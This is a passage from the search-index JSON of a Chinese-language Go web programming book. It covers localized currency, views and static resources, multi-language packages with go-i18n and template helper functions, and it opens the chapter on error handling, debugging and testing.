\u66ff\u6362\u621024\n}\n</code></pre></p>"},{"location":"10.2/#_3","title":"\u672c\u5730\u5316\u8d27\u5e01\u503c","text":"<p>\u5404\u4e2a\u5730\u533a\u7684\u8d27\u5e01\u8868\u793a\u4e5f\u4e0d\u4e00\u6837\uff0c\u5904\u7406\u65b9\u5f0f\u4e5f\u4e0e\u65e5\u671f\u5dee\u4e0d\u591a\uff0c\u7ec6\u8282\u8bf7\u770b\u4e0b\u9762\u4ee3\u7801: <pre><code>en[\"money\"] =\"USD %d\"\ncn[\"money\"] =\"\uffe5%d\u5143\"\n\nfmt.Println(money_format(msg(lang,\"money\"),100))\n\nfunc money_format(fomate string,money int64) string{\nreturn fmt.Sprintf(fomate,money)\n}\n</code></pre></p>"},{"location":"10.2/#_4","title":"\u672c\u5730\u5316\u89c6\u56fe\u548c\u8d44\u6e90","text":"<p>\u6211\u4eec\u53ef\u80fd\u4f1a\u6839\u636eLocale\u7684\u4e0d\u540c\u6765\u5c55\u793a\u89c6\u56fe\uff0c\u8fd9\u4e9b\u89c6\u56fe\u5305\u542b\u4e0d\u540c\u7684\u56fe\u7247\u3001css\u3001js\u7b49\u5404\u79cd\u9759\u6001\u8d44\u6e90\u3002\u90a3\u4e48\u5e94\u5982\u4f55\u6765\u5904\u7406\u8fd9\u4e9b\u4fe1\u606f\u5462\uff1f\u9996\u5148\u6211\u4eec\u5e94\u6309locale\u6765\u7ec4\u7ec7\u6587\u4ef6\u4fe1\u606f\uff0c\u8bf7\u770b\u4e0b\u9762\u7684\u6587\u4ef6\u76ee\u5f55\u5b89\u6392\uff1a <pre><code>views\n|--en  //\u82f1\u6587\u6a21\u677f\n    |--images     //\u5b58\u50a8\u56fe\u7247\u4fe1\u606f\n    |--js         //\u5b58\u50a8JS\u6587\u4ef6\n    |--css        //\u5b58\u50a8css\u6587\u4ef6\n    index.tpl     //\u7528\u6237\u9996\u9875\n    login.tpl     //\u767b\u9646\u9996\u9875\n|--zh-CN //\u4e2d\u6587\u6a21\u677f\n    |--images\n    |--js\n    |--css\n    index.tpl\n    login.tpl\n</code></pre> \u6709\u4e86\u8fd9\u4e2a\u76ee\u5f55\u7ed3\u6784\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u5728\u6e32\u67d3\u7684\u5730\u65b9\u8fd9\u6837\u6765\u5b9e\u73b0\u4ee3\u7801\uff1a <pre><code>s1, _ := template.ParseFiles(\"views/\"+lang+\"/index.tpl\")\nVV.Lang=lang\ns1.Execute(os.Stdout, VV)\n</code></pre> \u800c\u5bf9\u4e8e\u91cc\u9762\u7684index.tpl\u91cc\u9762\u7684\u8d44\u6e90\u8bbe\u7f6e\u5982\u4e0b\uff1a <pre><code>// js\u6587\u4ef6\n&lt;script type=\"text/javascript\" src=\"views/{{.Lang}}/js/jquery/jquery-1.8.0.min.js\"&gt;&lt;/script&gt;\n// css\u6587\u4ef6\n&lt;link href=\"views/{{.Lang}}/css/bootstrap-responsive.min.css\" rel=\"stylesheet\"&gt;\n// \u56fe\u7247\u6587\u4ef6\n&lt;img src=\"views/{{.Lang}}/images/btn.png\"&gt;\n</code></pre> \u91c7\u7528\u8fd9\u79cd\u65b9\u5f0f\u6765\u672c\u5730\u5316\u89c6\u56fe\u4ee5\u53ca\u8d44\u6e90\u65f6\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f88\u5bb9\u6613\u7684\u8fdb\u884c\u6269\u5c55\u4e86\u3002</p>"},{"location":"10.2/#_5","title":"\u603b\u7ed3","text":"<p>\u672c\u5c0f\u8282\u4ecb\u7ecd\u4e86\u5982\u4f55\u4f7f\u7528\u53ca\u5b58\u50a8\u672c\u5730\u8d44\u6e90\uff0c\u6709\u65f6\u9700\u8981\u901a\u8fc7\u8f6c\u6362\u51fd\u6570\u6765\u5b9e\u73b0\uff0c\u6709\u65f6\u901a\u8fc7lang\u6765\u8bbe\u7f6e\uff0c\u4f46\u662f\u6700\u7ec8\u90fd\u662f\u901a\u8fc7key-value\u7684\u65b9\u5f0f\u6765\u5b58\u50a8Locale\u5bf9\u5e94\u7684\u6570\u636e\uff0c\u5728\u9700\u8981\u65f6\u53d6\u51fa\u76f8\u5e94\u4e8eLocale\u7684\u4fe1\u606f\u540e\uff0c\u5982\u679c\u662f\u6587\u672c\u4fe1\u606f\u5c31\u76f4\u63a5\u8f93\u51fa\uff0c\u5982\u679c\u662f\u65f6\u95f4\u65e5\u671f\u6216\u8005\u8d27\u5e01\uff0c\u5219\u9700\u8981\u5148\u901a\u8fc7<code>fmt.Printf</code>\u6216\u5176\u4ed6\u683c\u5f0f\u5316\u51fd\u6570\u6765\u5904\u7406\uff0c\u800c\u5bf9\u4e8e\u4e0d\u540cLocale\u7684\u89c6\u56fe\u548c\u8d44\u6e90\u5219\u662f\u6700\u7b80\u5355\u7684\uff0c\u53ea\u8981\u5728\u8def\u5f84\u91cc\u9762\u589e\u52a0lang\u5c31\u53ef\u4ee5\u5b9e\u73b0\u4e86\u3002</p>"},{"location":"10.2/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u8bbe\u7f6e\u9ed8\u8ba4\u5730\u533a</li> <li>\u4e0b\u4e00\u8282: \u56fd\u9645\u5316\u7ad9\u70b9</li> </ul>"},{"location":"10.3/","title":"10.3 \u56fd\u9645\u5316\u7ad9\u70b9","text":""},{"location":"10.3/#103","title":"10.3 \u56fd\u9645\u5316\u7ad9\u70b9","text":"<p>\u524d\u9762\u5c0f\u8282\u4ecb\u7ecd\u4e86\u5982\u4f55\u5904\u7406\u672c\u5730\u5316\u8d44\u6e90\uff0c\u5373Locale\u4e00\u4e2a\u76f8\u5e94\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u90a3\u4e48\u5982\u679c\u5904\u7406\u591a\u4e2a\u7684\u672c\u5730\u5316\u8d44\u6e90\u5462\uff1f\u800c\u5bf9\u4e8e\u4e00\u4e9b\u6211\u4eec\u7ecf\u5e38\u7528\u5230\u7684\u4f8b\u5982\uff1a\u7b80\u5355\u7684\u6587\u672c\u7ffb\u8bd1\u3001\u65f6\u95f4\u65e5\u671f\u3001\u6570\u5b57\u7b49\u5982\u679c\u5904\u7406\u5462\uff1f\u672c\u5c0f\u8282\u5c06\u4e00\u4e00\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\u3002</p>"},{"location":"10.3/#_1","title":"\u7ba1\u7406\u591a\u4e2a\u672c\u5730\u5305","text":"<p>\u5728\u5f00\u53d1\u4e00\u4e2a\u5e94\u7528\u7684\u65f6\u5019\uff0c\u9996\u5148\u6211\u4eec\u8981\u51b3\u5b9a\u662f\u53ea\u652f\u6301\u4e00\u79cd\u8bed\u8a00\uff0c\u8fd8\u662f\u591a\u79cd\u8bed\u8a00\uff0c\u5982\u679c\u8981\u652f\u6301\u591a\u79cd\u8bed\u8a00\uff0c\u6211\u4eec\u5219\u9700\u8981\u5236\u5b9a\u4e00\u4e2a\u7ec4\u7ec7\u7ed3\u6784\uff0c\u4ee5\u65b9\u4fbf\u5c06\u6765\u66f4\u591a\u8bed\u8a00\u7684\u6dfb\u52a0\u3002\u5728\u6b64\u6211\u4eec\u8bbe\u8ba1\u5982\u4e0b\uff1aLocale\u6709\u5173\u7684\u6587\u4ef6\u653e\u7f6e\u5728config/locales\u4e0b\uff0c\u5047\u8bbe\u4f60\u8981\u652f\u6301\u4e2d\u6587\u548c\u82f1\u6587\uff0c\u90a3\u4e48\u4f60\u9700\u8981\u5728\u8fd9\u4e2a\u6587\u4ef6\u5939\u4e0b\u653e\u7f6een.json\u548czh.json\u3002\u5927\u6982\u7684\u5185\u5bb9\u5982\u4e0b\u6240\u793a\uff1a <pre><code># zh.json\n\n{\n\"zh\": {\n\"submit\": \"\u63d0\u4ea4\",\n\"create\": \"\u521b\u5efa\"\n}\n}\n\n# en.json\n\n{\n\"en\": {\n\"submit\": \"Submit\",\n\"create\": \"Create\"\n}\n}\n</code></pre> \u4e3a\u4e86\u652f\u6301\u56fd\u9645\u5316\uff0c\u5728\u6b64\u6211\u4eec\u4f7f\u7528\u4e86\u4e00\u4e2a\u56fd\u9645\u5316\u76f8\u5173\u7684\u5305\u2014\u2014go-i18n\uff0c\u9996\u5148\u6211\u4eec\u5411go-i18n\u5305\u6ce8\u518cconfig/locales\u8fd9\u4e2a\u76ee\u5f55,\u4ee5\u52a0\u8f7d\u6240\u6709\u7684locale\u6587\u4ef6 <pre><code>Tr:=i18n.NewLocale()\nTr.LoadPath(\"config/locales\")\n</code></pre> \u8fd9\u4e2a\u5305\u4f7f\u7528\u8d77\u6765\u5f88\u7b80\u5355\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u7684\u65b9\u5f0f\u8fdb\u884c\u6d4b\u8bd5\uff1a <pre><code>fmt.Println(Tr.Translate(\"submit\"))\n//\u8f93\u51faSubmit\nTr.SetLocale(\"zh\")\nfmt.Println(Tr.Translate(\"submit\"))\n//\u8f93\u51fa\u201c\u63d0\u4ea4\u201d\n</code></pre></p>"},{"location":"10.3/#_2","title":"\u81ea\u52a8\u52a0\u8f7d\u672c\u5730\u5305","text":"<p>\u4e0a\u9762\u6211\u4eec\u4ecb\u7ecd\u4e86\u5982\u4f55\u81ea\u52a8\u52a0\u8f7d\u81ea\u5b9a\u4e49\u8bed\u8a00\u5305\uff0c\u5176\u5b9ego-i18n\u5e93\u5df2\u7ecf\u9884\u52a0\u8f7d\u4e86\u5f88\u591a\u9ed8\u8ba4\u7684\u683c\u5f0f\u4fe1\u606f\uff0c\u4f8b\u5982\u65f6\u95f4\u683c\u5f0f\u3001\u8d27\u5e01\u683c\u5f0f\uff0c\u7528\u6237\u53ef\u4ee5\u5728\u81ea\u5b9a\u4e49\u914d\u7f6e\u65f6\u6539\u5199\u8fd9\u4e9b\u9ed8\u8ba4\u914d\u7f6e\uff0c\u8bf7\u770b\u4e0b\u9762\u7684\u5904\u7406\u8fc7\u7a0b\uff1a <pre><code>//\u52a0\u8f7d\u9ed8\u8ba4\u914d\u7f6e\u6587\u4ef6\uff0c\u8fd9\u4e9b\u6587\u4ef6\u90fd\u653e\u5728go-i18n/locales\u4e0b\u9762\n\n//\u6587\u4ef6\u547d\u540dzh.json\u3001en.json\u3001en-US.json\u7b49\uff0c\u53ef\u4ee5\u4e0d\u65ad\u7684\u6269\u5c55\u652f\u6301\u66f4\u591a\u7684\u8bed\u8a00\n\nfunc (il *IL) loadDefaultTranslations(dirPath string) error {\ndir, err := os.Open(dirPath)\nif err != nil {\nreturn err\n}\ndefer dir.Close()\n\nnames, err := dir.Readdirnames(-1)\nif err != nil {\nreturn err\n}\n\nfor _, name := range names {\nfullPath := path.Join(dirPath, name)\n\nfi, err := os.Stat(fullPath)\nif err != nil {\nreturn err\n}\n\nif fi.IsDir() {\nif err := il.loadTranslations(fullPath); err != nil {\nreturn err\n}\n} else if locale := il.matchingLocaleFromFileName(name); locale != \"\" {\nfile, err := os.Open(fullPath)\nif err != nil {\nreturn err\n}\ndefer file.Close()\n\nif err := il.loadTranslation(file, locale); err != nil {\nreturn err\n}\n}\n}\n\nreturn nil\n}\n</code></pre> \u901a\u8fc7\u4e0a\u9762\u7684\u65b9\u6cd5\u52a0\u8f7d\u914d\u7f6e\u4fe1\u606f\u5230\u9ed8\u8ba4\u7684\u6587\u4ef6\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u5728\u6211\u4eec\u6ca1\u6709\u81ea\u5b9a\u4e49\u65f6\u95f4\u4fe1\u606f\u7684\u65f6\u5019\u6267\u884c\u5982\u4e0b\u7684\u4ee3\u7801\u83b7\u53d6\u5bf9\u5e94\u7684\u4fe1\u606f: <pre><code>//locale=zh\u7684\u60c5\u51b5\u4e0b\uff0c\u6267\u884c\u5982\u4e0b\u4ee3\u7801\uff1a\n\nfmt.Println(Tr.Time(time.Now()))\n//\u8f93\u51fa\uff1a2009\u5e741\u670808\u65e5 \u661f\u671f\u56db 20:37:58 CST\n\nfmt.Println(Tr.Time(time.Now(),\"long\"))\n//\u8f93\u51fa\uff1a2009\u5e741\u670808\u65e5\n\nfmt.Println(Tr.Money(11.11))\n//\u8f93\u51fa:\uffe511.11\n</code></pre></p>"},{"location":"10.3/#template-mapfunc","title":"template mapfunc","text":"<p>\u4e0a\u9762\u6211\u4eec\u5b9e\u73b0\u4e86\u591a\u4e2a\u8bed\u8a00\u5305\u7684\u7ba1\u7406\u548c\u52a0\u8f7d\uff0c\u800c\u4e00\u4e9b\u51fd\u6570\u7684\u5b9e\u73b0\u662f\u57fa\u4e8e\u903b\u8f91\u5c42\u7684\uff0c\u4f8b\u5982\uff1a\"Tr.Translate\"\u3001\"Tr.Time\"\u3001\"Tr.Money\"\u7b49\uff0c\u867d\u7136\u6211\u4eec\u5728\u903b\u8f91\u5c42\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u51fd\u6570\u628a\u9700\u8981\u7684\u53c2\u6570\u8fdb\u884c\u8f6c\u6362\u540e\u5728\u6a21\u677f\u5c42\u6e32\u67d3\u7684\u65f6\u5019\u76f4\u63a5\u8f93\u51fa\uff0c\u4f46\u662f\u5982\u679c\u6211\u4eec\u60f3\u5728\u6a21\u7248\u5c42\u76f4\u63a5\u4f7f\u7528\u8fd9\u4e9b\u51fd\u6570\u8be5\u600e\u4e48\u5b9e\u73b0\u5462\uff1f\u4e0d\u77e5\u4f60\u662f\u5426\u8fd8\u8bb0\u5f97\uff0c\u5728\u524d\u9762\u4ecb\u7ecd\u6a21\u677f\u7684\u65f6\u5019\u8bf4\u8fc7\uff1aGo\u8bed\u8a00\u7684\u6a21\u677f\u652f\u6301\u81ea\u5b9a\u4e49\u6a21\u677f\u51fd\u6570\uff0c\u4e0b\u9762\u662f\u6211\u4eec\u5b9e\u73b0\u7684\u65b9\u4fbf\u64cd\u4f5c\u7684mapfunc\uff1a</p> <ol> <li>\u6587\u672c\u4fe1\u606f</li> </ol> <p>\u6587\u672c\u4fe1\u606f\u8c03\u7528<code>Tr.Translate</code>\u6765\u5b9e\u73b0\u76f8\u5e94\u7684\u4fe1\u606f\u8f6c\u6362\uff0cmapFunc\u7684\u5b9e\u73b0\u5982\u4e0b\uff1a <pre><code>func I18nT(args ...interface{}) string {\nok := false\nvar s string\nif len(args) == 1 {\ns, ok = args[0].(string)\n}\nif !ok {\ns = fmt.Sprint(args...)\n}\nreturn Tr.Translate(s)\n}\n</code></pre> \u6ce8\u518c\u51fd\u6570\u5982\u4e0b\uff1a <pre><code>t.Funcs(template.FuncMap{\"T\": I18nT})\n</code></pre> \u6a21\u677f\u4e2d\u4f7f\u7528\u5982\u4e0b\uff1a <pre><code>{{.V.Submit | T}}\n</code></pre></p> <ol> <li>\u65f6\u95f4\u65e5\u671f</li> </ol> <p>\u65f6\u95f4\u65e5\u671f\u8c03\u7528<code>Tr.Time</code>\u51fd\u6570\u6765\u5b9e\u73b0\u76f8\u5e94\u7684\u65f6\u95f4\u8f6c\u6362\uff0cmapFunc\u7684\u5b9e\u73b0\u5982\u4e0b\uff1a <pre><code>func I18nTimeDate(args ...interface{}) string {\nok := false\nvar s string\nif len(args) == 1 {\ns, ok = args[0].(string)\n}\nif !ok {\ns = fmt.Sprint(args...)\n}\nreturn Tr.Time(s)\n}\n</code></pre> \u6ce8\u518c\u51fd\u6570\u5982\u4e0b\uff1a <pre><code>t.Funcs(template.FuncMap{\"TD\": I18nTimeDate})\n</code></pre> \u6a21\u677f\u4e2d\u4f7f\u7528\u5982\u4e0b\uff1a <pre><code>{{.V.Now | TD}}\n</code></pre> 3. \u8d27\u5e01\u4fe1\u606f</p> <p>\u8d27\u5e01\u8c03\u7528<code>Tr.Money</code>\u51fd\u6570\u6765\u5b9e\u73b0\u76f8\u5e94\u7684\u65f6\u95f4\u8f6c\u6362\uff0cmapFunc\u7684\u5b9e\u73b0\u5982\u4e0b\uff1a <pre><code>func I18nMoney(args ...interface{}) string {\nok := false\nvar s string\nif len(args) == 1 {\ns, ok = args[0].(string)\n}\nif !ok {\ns = fmt.Sprint(args...)\n}\nreturn Tr.Money(s)\n}\n</code></pre> \u6ce8\u518c\u51fd\u6570\u5982\u4e0b\uff1a <pre><code>t.Funcs(template.FuncMap{\"M\": I18nMoney})\n</code></pre> \u6a21\u677f\u4e2d\u4f7f\u7528\u5982\u4e0b\uff1a <pre><code>{{.V.Money | M}}\n</code></pre></p>"},{"location":"10.3/#_3","title":"\u603b\u7ed3","text":"<p>\u901a\u8fc7\u8fd9\u5c0f\u8282\u6211\u4eec\u77e5\u9053\u4e86\u5982\u4f55\u5b9e\u73b0\u4e00\u4e2a\u591a\u8bed\u8a00\u5305\u7684Web\u5e94\u7528\uff0c\u901a\u8fc7\u81ea\u5b9a\u4e49\u8bed\u8a00\u5305\u6211\u4eec\u53ef\u4ee5\u65b9\u4fbf\u7684\u5b9e\u73b0\u591a\u8bed\u8a00\uff0c\u800c\u4e14\u901a\u8fc7\u914d\u7f6e\u6587\u4ef6\u80fd\u591f\u975e\u5e38\u65b9\u4fbf\u7684\u6269\u5145\u591a\u8bed\u8a00\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cgo-i18n\u4f1a\u81ea\u5b9a\u52a0\u8f7d\u4e00\u4e9b\u516c\u5171\u7684\u914d\u7f6e\u4fe1\u606f\uff0c\u4f8b\u5982\u65f6\u95f4\u3001\u8d27\u5e01\u7b49\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u975e\u5e38\u65b9\u4fbf\u7684\u4f7f\u7528\uff0c\u540c\u65f6\u4e3a\u4e86\u652f\u6301\u5728\u6a21\u677f\u4e2d\u4f7f\u7528\u8fd9\u4e9b\u51fd\u6570\uff0c\u4e5f\u5b9e\u73b0\u4e86\u76f8\u5e94\u7684\u6a21\u677f\u51fd\u6570\uff0c\u8fd9\u6837\u5c31\u5141\u8bb8\u6211\u4eec\u5728\u5f00\u53d1Web\u5e94\u7528\u7684\u65f6\u5019\u76f4\u63a5\u5728\u6a21\u677f\u4e2d\u901a\u8fc7pipeline\u7684\u65b9\u5f0f\u6765\u64cd\u4f5c\u591a\u8bed\u8a00\u5305\u3002</p>"},{"location":"10.3/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u672c\u5730\u5316\u8d44\u6e90</li> <li>\u4e0b\u4e00\u8282: \u5c0f\u7ed3</li> </ul>"},{"location":"10.4/","title":"10.4 \u5c0f\u7ed3","text":"<p>\u901a\u8fc7\u8fd9\u4e00\u7ae0\u7684\u4ecb\u7ecd\uff0c\u8bfb\u8005\u5e94\u8be5\u5bf9\u5982\u4f55\u64cd\u4f5ci18n\u6709\u4e86\u6df1\u5165\u7684\u4e86\u89e3\uff0c\u6211\u4e5f\u6839\u636e\u8fd9\u4e00\u7ae0\u4ecb\u7ecd\u7684\u5185\u5bb9\u5b9e\u73b0\u4e86\u4e00\u4e2a\u5f00\u6e90\u7684\u89e3\u51b3\u65b9\u6848go-i18n\uff1ahttps://github.com/astaxie/go-i18n  \u901a\u8fc7\u8fd9\u4e2a\u5f00\u6e90\u5e93\u6211\u4eec\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u5b9e\u73b0\u591a\u8bed\u8a00\u7248\u672c\u7684Web\u5e94\u7528\uff0c\u4f7f\u5f97\u6211\u4eec\u7684\u5e94\u7528\u80fd\u591f\u8f7b\u677e\u7684\u5b9e\u73b0\u56fd\u9645\u5316\u3002\u5982\u679c\u4f60\u53d1\u73b0\u8fd9\u4e2a\u5f00\u6e90\u5e93\u4e2d\u7684\u9519\u8bef\u6216\u8005\u90a3\u4e9b\u7f3a\u5931\u7684\u5730\u65b9\uff0c\u8bf7\u4e00\u8d77\u53c2\u4e0e\u5230\u8fd9\u4e2a\u5f00\u6e90\u9879\u76ee\u4e2d\u6765\uff0c\u8ba9\u6211\u4eec\u7684\u8fd9\u4e2a\u5e93\u4e89\u53d6\u6210\u4e3aGo\u7684\u6807\u51c6\u5e93\u3002</p>"},{"location":"10.4/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u56fd\u9645\u5316\u7ad9\u70b9</li> <li>\u4e0b\u4e00\u8282: \u9519\u8bef\u5904\u7406\uff0c\u6545\u969c\u6392\u9664\u548c\u6d4b\u8bd5</li> </ul>"},{"location":"11.0/","title":"11 \u9519\u8bef\u5904\u7406\uff0c\u8c03\u8bd5\u548c\u6d4b\u8bd5","text":"<p>\u6211\u4eec\u7ecf\u5e38\u4f1a\u770b\u5230\u5f88\u591a\u7a0b\u5e8f\u5458\u5927\u90e8\u5206\u7684\"\u7f16\u7a0b\"\u65f6\u95f4\u90fd\u82b1\u8d39\u5728\u68c0\u67e5bug\u548c\u4fee\u590dbug\u4e0a\u3002\u65e0\u8bba\u4f60\u662f\u5728\u7f16\u5199\u4fee\u6539\u4ee3\u7801\u8fd8\u662f\u91cd\u6784\u7cfb\u7edf\uff0c\u51e0\u4e4e\u90fd\u662f\u82b1\u8d39\u5927\u91cf\u7684\u65f6\u95f4\u5728\u8fdb\u884c\u6545\u969c\u6392\u9664\u548c\u6d4b\u8bd5\uff0c\u5916\u754c\u90fd\u89c9\u5f97\u6211\u4eec\u7a0b\u5e8f\u5458\u662f\u8bbe\u8ba1\u5e08\uff0c\u80fd\u591f\u628a\u4e00\u4e2a\u7cfb\u7edf\u4ece\u65e0\u505a\u5230\u6709\uff0c\u662f\u4e00\u9879\u5f88\u4f1f\u5927\u7684\u5de5\u4f5c\uff0c\u800c\u4e14\u662f\u76f8\u5f53\u6709\u8da3\u7684\u5de5\u4f5c\uff0c\u4f46\u4e8b\u5b9e\u4e0a\u6211\u4eec\u6bcf\u5929\u90fd\u662f\u5f98\u5f8a\u5728\u6392\u9519\u3001\u8c03\u8bd5\u3001\u6d4b\u8bd5\u4e4b\u95f4\u3002\u5f53\u7136\u5982\u679c\u4f60\u6709\u826f\u597d\u7684\u4e60\u60ef\u548c\u6280\u672f\u65b9\u6848\u6765\u76f4\u9762\u8fd9\u4e9b\u95ee\u9898\uff0c\u90a3\u4e48\u4f60\u5c31\u6709\u53ef\u80fd\u5c06\u6392\u9519\u65f6\u95f4\u51cf\u5230\u6700\u5c11\uff0c\u800c\u5c3d\u53ef\u80fd\u7684\u5c06\u65f6\u95f4\u82b1\u8d39\u5728\u66f4\u6709\u4ef7\u503c\u7684\u4e8b\u60c5\u4e0a\u3002</p> <p>\u4f46\u662f\u9057\u61be\u7684\u662f\u5f88\u591a\u7a0b\u5e8f\u5458\u4e0d\u613f\u610f\u5728\u9519\u8bef\u5904\u7406\u3001\u8c03\u8bd5\u548c\u6d4b\u8bd5\u80fd\u529b\u4e0a\u4e0b\u5de5\u592b\uff0c\u5bfc\u81f4\u540e\u9762\u5e94\u7528\u4e0a\u7ebf\u4e4b\u540e\u67e5\u627e\u9519\u8bef\u3001\u5b9a\u4f4d\u95ee\u9898\u82b1\u8d39\u66f4\u591a\u7684\u65f6\u95f4\u3002\u6240\u4ee5\u6211\u4eec\u5728\u8bbe\u8ba1\u5e94\u7528\u4e4b\u524d\u5c31\u505a\u597d\u9519\u8bef\u5904\u7406\u89c4\u5212\u3001\u6d4b\u8bd5\u7528\u4f8b\u7b49\uff0c\u90a3\u4e48\u5c06\u6765\u4fee\u6539\u4ee3\u7801\u3001\u5347\u7ea7\u7cfb\u7edf\u90fd\u5c06\u53d8\u5f97\u7b80\u5355\u3002</p> <p>\u5f00\u53d1Web\u5e94\u7528\u8fc7\u7a0b\u4e2d\uff0c\u9519\u8bef\u81ea\u7136\u96be\u514d\uff0c\u90a3\u4e48\u5982\u4f55\u66f4\u597d\u7684\u627e\u5230\u9519\u8bef\u539f\u56e0\uff0c\u89e3\u51b3\u95ee\u9898\u5462\uff1f11.1\u5c0f\u8282\u5c06\u4ecb\u7ecdGo\u8bed\u8a00\u4e2d\u5982\u4f55\u5904\u7406\u9519\u8bef\uff0c\u5982\u4f55\u8bbe\u8ba1\u81ea\u5df1\u7684\u5305\u3001\u51fd\u6570\u7684\u9519\u8bef\u5904\u7406\uff0c11.2\u5c0f\u8282\u5c06\u4ecb\u7ecd\u5982\u4f55\u4f7f\u7528GDB\u6765\u8c03\u8bd5\u6211\u4eec\u7684\u7a0b\u5e8f\uff0c\u52a8\u6001\u8fd0\u884c\u60c5\u51b5\u4e0b\u5404\u79cd\u53d8\u91cf\u4fe1\u606f\uff0c\u8fd0\u884c\u60c5\u51b5\u7684\u76d1\u63a7\u548c\u8c03\u8bd5\u3002</p> <p>11.3\u5c0f\u8282\u5c06\u5bf9Go\u8bed\u8a00\u4e2d\u7684\u5355\u5143\u6d4b\u8bd5\u8fdb\u884c\u6df1\u5165\u7684\u63a2\u8ba8\uff0c\u5e76\u793a\u4f8b\u5982\u4f55\u6765\u7f16\u5199\u5355\u5143\u6d4b\u8bd5\uff0cGo\u7684\u5355\u5143\u6d4b\u8bd5\u89c4\u5219\u89c4\u8303\u5982\u4f55\u5b9a\u4e49\uff0c\u4ee5\u4fdd\u8bc1\u4ee5\u540e\u5347\u7ea7\u4fee\u6539\u8fd0\u884c\u76f8\u5e94\u7684\u6d4b\u8bd5\u4ee3\u7801\u5c31\u53ef\u4ee5\u8fdb\u884c\u6700\u5c0f\u5316\u7684\u6d4b\u8bd5\u3002</p> <p>\u957f\u671f\u4ee5\u6765\uff0c\u57f9\u517b\u826f\u597d\u7684\u8c03\u8bd5\u3001\u6d4b\u8bd5\u4e60\u60ef\u4e00\u76f4\u662f\u5f88\u591a\u7a0b\u5e8f\u5458\u9003\u907f\u7684\u4e8b\u60c5\uff0c\u6240\u4ee5\u73b0\u5728\u4f60\u4e0d\u8981\u518d\u9003\u907f\u4e86\uff0c\u5c31\u4ece\u4f60\u73b0\u5728\u7684\u9879\u76ee\u5f00\u53d1\uff0c\u4ece\u5b66\u4e60Go Web\u5f00\u53d1\u5f00\u59cb\u517b\u6210\u826f\u597d\u7684\u4e60\u60ef\u3002</p>"},{"location":"11.0/#_1","title":"\u76ee\u5f55","text":""},{"location":"11.0/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: \u7b2c\u5341\u7ae0\u603b\u7ed3</li> <li>\u4e0b\u4e00\u8282: \u9519\u8bef\u5904\u7406</li> </ul>"},{"location":"11.1/","title":"11.1 \u9519\u8bef\u5904\u7406","text":"<p>Go\u8bed\u8a00\u4e3b\u8981\u7684\u8bbe\u8ba1\u51c6\u5219\u662f\uff1a\u7b80\u6d01\u3001\u660e\u767d\uff0c\u7b80\u6d01\u662f\u6307\u8bed\u6cd5\u548cC\u7c7b\u4f3c\uff0c\u76f8\u5f53\u7684\u7b80\u5355\uff0c\u660e\u767d\u662f\u6307\u4efb\u4f55\u8bed\u53e5\u90fd\u662f\u5f88\u660e\u663e\u7684\uff0c\u4e0d\u542b\u6709\u4efb\u4f55\u9690\u542b\u7684\u4e1c\u897f\uff0c\u5728\u9519\u8bef\u5904\u7406\u65b9\u6848\u7684\u8bbe\u8ba1\u4e2d\u4e5f\u8d2f\u5f7b\u4e86\u8fd9\u4e00\u601d\u60f3\u3002\u6211\u4eec\u77e5\u9053\u5728C\u8bed\u8a00\u91cc\u9762\u662f\u901a\u8fc7\u8fd4\u56de-1\u6216\u8005NULL\u4e4b\u7c7b\u7684\u4fe1\u606f\u6765\u8868\u793a\u9519\u8bef\uff0c\u4f46\u662f\u5bf9\u4e8e\u4f7f\u7528\u8005\u6765\u8bf4\uff0c\u4e0d\u67e5\u770b\u76f8\u5e94\u7684API\u8bf4\u660e\u6587\u6863\uff0c\u6839\u672c\u641e\u4e0d\u6e05\u695a\u8fd9\u4e2a\u8fd4\u56de\u503c\u7a76\u7adf\u4ee3\u8868\u4ec0\u4e48\u610f\u601d\uff0c\u6bd4\u5982:\u8fd4\u56de0\u662f\u6210\u529f\uff0c\u8fd8\u662f\u5931\u8d25,\u800cGo\u5b9a\u4e49\u4e86\u4e00\u4e2a\u53eb\u505aerror\u7684\u7c7b\u578b\uff0c\u6765\u663e\u5f0f\u8868\u8fbe\u9519\u8bef\u3002\u5728\u4f7f\u7528\u65f6\uff0c\u901a\u8fc7\u628a\u8fd4\u56de\u7684error\u53d8\u91cf\u4e0enil\u7684\u6bd4\u8f83\uff0c\u6765\u5224\u5b9a\u64cd\u4f5c\u662f\u5426\u6210\u529f\u3002\u4f8b\u5982<code>os.Open</code>\u51fd\u6570\u5728\u6253\u5f00\u6587\u4ef6\u5931\u8d25\u65f6\u5c06\u8fd4\u56de\u4e00\u4e2a\u4e0d\u4e3anil\u7684error\u53d8\u91cf <pre><code>func Open(name string) (file *File, err error)\n</code></pre> \u4e0b\u9762\u8fd9\u4e2a\u4f8b\u5b50\u901a\u8fc7\u8c03\u7528<code>os.Open</code>\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\uff0c\u5982\u679c\u51fa\u73b0\u9519\u8bef\uff0c\u90a3\u4e48\u5c31\u4f1a\u8c03\u7528<code>log.Fatal</code>\u6765\u8f93\u51fa\u9519\u8bef\u4fe1\u606f\uff1a <pre><code>f, err := os.Open(\"filename.ext\")\nif err != nil {\nlog.Fatal(err)\n}\n</code></pre> 